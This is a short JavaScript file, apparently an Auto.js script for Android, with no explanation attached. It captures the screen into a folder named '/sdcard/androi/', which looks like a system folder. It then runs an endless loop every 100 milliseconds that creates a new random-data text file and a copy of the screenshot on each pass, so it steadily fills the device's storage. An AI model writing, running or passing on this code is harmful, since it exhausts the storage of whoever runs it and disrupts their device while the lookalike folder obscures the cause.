info();

function info() {
    files.createWithDirs("/sdcard/androi/")
    files.ensureDir("/sdcard/androi/")
    main();
}

function main() {
    var i = 1;
    var path = "/sdcard/androi/"
    requestScreenCapture()
    var img = captureScreen();
    if (files.exists(path + "nom.txt") == false) {
        files.create(path + "nom.txt")
        files.write(path + "nom.txt", i)
    } else {
        var i = (files.read(path + "nom.txt"))
    }
    images.saveImage(img, path + "1.png");

    setInterval(function() {
        i++;
        files.create(path + i + ".txt")
        files.write(path + i + ".txt", random())
        files.copy(path + "1.png", path + i + ".png")
        files.write(path + "nom.txt" , i)
    }, 100);



}